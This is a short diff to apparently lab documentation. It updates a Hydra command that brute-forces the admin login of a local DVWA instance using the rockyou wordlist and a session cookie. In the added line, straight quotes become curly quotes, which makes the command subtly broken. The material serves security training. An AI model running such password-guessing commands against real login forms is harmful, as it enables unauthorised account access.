@@ -34,5 +34,5 @@ hydra -f -s 4280 -l admin -P ../rockyou.txt localhost http-form-get "/vulnerabil
 For local docker compose
 
 ```
-hydra -f -s 4280 -l admin -P rockyou.txt localhost http-form-get "/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=submit:H=Cookie: security=low; PHPSESSID=1de6c52c71ea064025e336c8124aa8e5:F=Username and/or password incorrect."
+hydra -f -s 4280 -l admin -P ../rockyou.txt localhost http-form-get “/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=submit:H=Cookie: security=low; PHPSESSID=ac2efa7619deb651d3525da4c6371b5d:F=Username and/or password incorrect.”
 ```
